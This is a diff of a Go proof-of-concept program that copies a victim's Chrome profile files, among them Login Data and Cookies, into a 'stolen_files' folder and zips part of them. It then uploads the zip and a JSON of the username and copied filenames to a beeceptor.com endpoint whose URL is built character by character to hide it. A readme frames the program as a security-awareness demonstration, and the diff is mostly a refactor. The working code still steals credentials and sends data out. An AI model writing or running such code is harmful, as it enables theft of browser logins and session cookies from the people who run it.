@@ -1,17 +1,20 @@
 package main
 
 import (
+	"github.com/gophish/gophish/logger"
+	"github.com/sirupsen/logrus"
 	"os"
 	"os/exec"
+	"os/user"
 	utils "poc/pkg/utils"
 	"runtime"
 	"strings"
 	"time"
 )
 
-const tmp_folder_name = "trust_me"
+const tmpStolenFilesFolderName = "stolen_files"
 
-var files_to_steal = []string{
+var filesToSteal = []string{
 	"Google Profile Picture.png",
 	"Login Data",
 	"Cookies",
@@ -19,11 +22,11 @@ var files_to_steal = []string{
 	"Bookmarks",
 }
 
-const mac_path = "/Library/Application Support/Google/Chrome/Default/"
-const win_path = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
-const linux_path = ""
+const macPath = "/Library/Application Support/Google/Chrome/Default/"
+const winPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
+const linuxPath = ""
 
-const readme_message = `This is just an example of what could be easily stolen from you,
+const readmeMessage = `This is just an example of what could be easily stolen from you,
 all the contents in this folder were copied from your computer to here.
 A zip was created with your picture and this readme file, and uploaded to a dummy endpoint.
 Only you know this url, and you need to have the browser open to receive the http post content,
@@ -36,115 +39,111 @@ Be mindfull of what you download and execute.
 url: `
 
 func main() {
+	// extract current user
+	user, err := utils.GetCurrentUser()
+	if err != nil {
+		logger.Warnf("An error occured while extracting the user")
+		os.Exit(0)
+	}
+
 	switch runtime.GOOS {
 	case "windows":
-		// fmt.Println("windows")
-		user, err := utils.GetCurrentUser()
-		if err != nil {
-			os.Exit(0)
-		}
-		tmp_folder := user.HomeDir + "\\AppData\\Local\\Temp\\" + tmp_folder_name + "\\"
-		if exploit(win_path, tmp_folder, true) {
+		tmpStolenFilesFolder := user.HomeDir + "\\AppData\\Local\\Temp\\" + tmpStolenFilesFolderName + "\\"
+		if exploit(winPath, tmpStolenFilesFolder, user, true) {
 
-			cmd := exec.Command("cmd", "/C", "start", tmp_folder)
+			cmd := exec.Command("cmd", "/C", "start", tmpStolenFilesFolder)
 			cmd.Run()
 
-			readme_file := tmp_folder + "readme.txt"
+			readme_file := tmpStolenFilesFolder + "readme.txt"
 			cmd = exec.Command("cmd", "/C", "notepad", readme_file)
 			cmd.Run()
 		}
 	case "darwin":
-		// fmt.Println("mac")
-		tmp_folder := "/tmp/" + tmp_folder_name + "/"
-		if exploit(mac_path, tmp_folder, false) {
-			cmd := exec.Command("open", tmp_folder)
+		tmpStolenFilesFolder := "/tmp/" + tmpStolenFilesFolderName + "/"
+		if exploit(macPath, tmpStolenFilesFolder, user, false) {
+			cmd := exec.Command("open", tmpStolenFilesFolder)
 			cmd.Run()
 		}
 	default:
-		// fmt.Println("linux")
-		tmp_folder := "/tmp/" + tmp_folder_name + "/"
-		exploit(linux_path, tmp_folder, false)
+		tmpStolenFilesFolder := "/tmp/" + tmpStolenFilesFolderName + "/"
+		exploit(linuxPath, tmpStolenFilesFolder, user, false)
 	}
 }
 
-func exploit(os_path string, tmp_folder string, is_win bool) bool {
+func exploit(osPath string, tmpStolenFilesFolder string, user *user.User, isWin bool) bool {
+	// concatenate the os path to each file
 	var files []string
-	for _, f := range files_to_steal {
-		files = append(files, os_path+f)
+	for _, f := range filesToSteal {
+		files = append(files, osPath+f)
 	}
 
 	// check if temp folder exists, if not, creates it
-	utils.CreateTmpFolder(tmp_folder)
+	utils.CreateTmpFolder(tmpStolenFilesFolder)
 
-	user, err := utils.GetCurrentUser()
-	if err != nil {
-		os.Exit(0)
+	// try to get the file and copy it, skip if it doesn't succeed
+	for _, filePath := range files {
+		fullPath := user.HomeDir + filePath
+		filename := utils.GetFileNameFromPath(fullPath, isWin)
+		destination := tmpStolenFilesFolder + filename
+		utils.FileCopy(fullPath, destination)
 	}
 
-	// honeybadger approach, try to get the file, if it doesn't succeed, it just doesn't care!
-	for _, file_path := range files {
-		full_path := user.HomeDir + file_path
-		filename := utils.GetFileNameFromPath(full_path, is_win)
-		dest := tmp_folder + filename
-		// fmt.Println(dest)
-		utils.FileCopy(full_path, dest)
-	}
-
-	// generate url
-	random_string := utils.GenerateRandomString(40)
-	dummy_endpoint_to_view_url := urlBuilder("view", random_string)
-	dummy_endpoint_to_post := urlBuilder("post", random_string)
+	// generate url - uses random url, so it's unlikely for someone to receive the data.
+	// (may happen only if someone is using the same randomly generated string before refreshing the page)
+	randomString := utils.GenerateRandomString(40)
+	dummyEndpointToViewUrl := urlBuilder("view", randomString)
+	dummyEndpointToPost := urlBuilder("post", randomString)
 
 	// create readme
-	readme_file := tmp_folder + "readme.txt"
-	readme_content := readme_message + dummy_endpoint_to_view_url + "\n\nfolder: " + tmp_folder
-	utils.CreateReadme(readme_file, readme_content)
+	readmeFile := tmpStolenFilesFolder + "readme.txt"
+	readmeContent := readmeMessage + dummyEndpointToViewUrl + "\n\nfolder: " + tmpStolenFilesFolder
+	utils.CreateReadme(readmeFile, readmeContent)
 
 	// Zip Files
-	files_to_zip := []string{
-		tmp_folder + utils.GetFileNameFromPath(files[0], is_win),
-		readme_file,
+	filesToZip := []string{
+		tmpStolenFilesFolder + utils.GetFileNameFromPath(files[0], isWin),
+		readmeFile,
 	}
-	zip_file := tmp_folder + "your_secrets.zip"
-	utils.ZipFiles(files_to_zip, zip_file, is_win)
+	zipFile := tmpStolenFilesFolder + "your_secrets.zip"
+	utils.ZipFiles(filesToZip, zipFile, isWin)
 
 	// open url
-	if is_win {
-		cmd := exec.Command("cmd", "/C", "start", "", dummy_endpoint_to_view_url)
+	if isWin {
+		cmd := exec.Command("cmd", "/C", "start", "", dummyEndpointToViewUrl)
 		cmd.Run()
 	} else {
-		cmd := exec.Command("open", dummy_endpoint_to_view_url)
+		cmd := exec.Command("open", dummyEndpointToViewUrl)
 		cmd.Run()
 	}
 
-	// wait 3 seconds
+	// wait for 3 seconds, to give the browser time to load
 	time.Sleep(time.Second * 3)
 
-	// post content
-	utils.SendFiles(dummy_endpoint_to_post, zip_file)
+	// post the files to that url
+	utils.SendFiles(dummyEndpointToPost, zipFile)
 
-	files_stolen := utils.ListDirRecursively(tmp_folder)
+	files_stolen := utils.ListDirRecursively(tmpStolenFilesFolder)
 
 	// post more data
 	json_string := `{"username":"` + user.Username + `", "files":"` + strings.Join(files_stolen, ",") + `", "msg":"you have just been pwned."}`
-	utils.PostJson(dummy_endpoint_to_post, json_string, user.Username)
+	utils.PostJson(dummyEndpointToPost, json_string, user.Username)
 
 	return true
 }
 
-func urlBuilder(option string, random_string string) string {
-	var full_string string
+func urlBuilder(option string, randomString string) string {
+	var fullString string
 
 	switch option {
 	case "view":
 		// https://beeceptor.com/console/
 		url := []string{"h", "t", "t", "p", "s", ":", "/", "/", "b", "e", "e", "c", "e", "p", "t", "o", "r", ".", "c", "o", "m", "/", "c", "o", "n", "s", "o", "l", "e", "/"}
-		full_string = strings.Join(url, "") + random_string
+		fullString = strings.Join(url, "") + randomString
 	case "post":
 		url := []string{"h", "t", "t", "p", "s", ":", "/", "/"}
 		end := []string{".", "f", "r", "e", "e", ".", "b", "e", "e", "c", "e", "p", "t", "o", "r", ".", "c", "o", "m"}
-		full_string = strings.Join(url, "") + random_string + strings.Join(end, "")
+		fullString = strings.Join(url, "") + randomString + strings.Join(end, "")
 	}
 
-	return full_string
+	return fullString
 }
